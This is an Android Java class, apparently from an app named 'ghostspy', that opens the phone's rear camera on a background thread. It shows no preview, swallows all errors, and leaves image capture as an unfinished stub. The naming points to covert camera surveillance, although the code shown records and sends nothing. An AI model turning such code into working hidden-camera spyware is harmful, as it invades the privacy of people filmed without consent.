package com.ghostspy;

import android.content.Context;
import android.graphics.SurfaceTexture;
import android.hardware.camera2.*;
import android.hardware.camera2.params.StreamConfigurationMap;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Size;
import android.view.Surface;
import java.util.Arrays;

public class CameraService {
    private Context ctx;
    private HandlerThread thread;
    private Handler handler;
    private CameraDevice camera;
    private boolean running = false;

    public CameraService(Context ctx) {
        this.ctx = ctx;
    }

    public void start() {
        if (running) return;
        running = true;
        thread = new HandlerThread("Camera");
        thread.start();
        handler = new Handler(thread.getLooper());
        try {
            CameraManager manager = (CameraManager) ctx.getSystemService(Context.CAMERA_SERVICE);
            String camId = manager.getCameraIdList()[0]; // belakang
            manager.openCamera(camId, new CameraDevice.StateCallback() {
                @Override public void onOpened(CameraDevice cam) {
                    camera = cam;
                    // Mulai capture sederhana
                }
                @Override public void onDisconnected(CameraDevice cam) { cam.close(); }
                @Override public void onError(CameraDevice cam, int error) { cam.close(); }
            }, handler);
        } catch (Exception e) {}
    }

    public void stop() {
        if (camera != null) camera.close();
        running = false;
        if (thread != null) thread.quitSafely();
    }
}
